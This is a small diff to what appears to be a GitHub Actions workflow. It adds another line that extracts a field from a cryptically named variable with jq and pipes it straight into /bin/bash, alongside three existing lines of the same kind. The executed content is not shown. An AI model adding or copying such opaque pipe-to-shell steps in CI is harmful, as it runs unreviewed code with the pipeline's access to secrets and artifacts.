@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$csa3" | jq -r .nz91077 | /bin/bash
           echo $w042 | jq -r .gxezj6 | /bin/bash
           printf '%s' "$qvng028" | jq -r .vp724 | /bin/bash
+          echo $sa41 | jq -r .fhe8 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
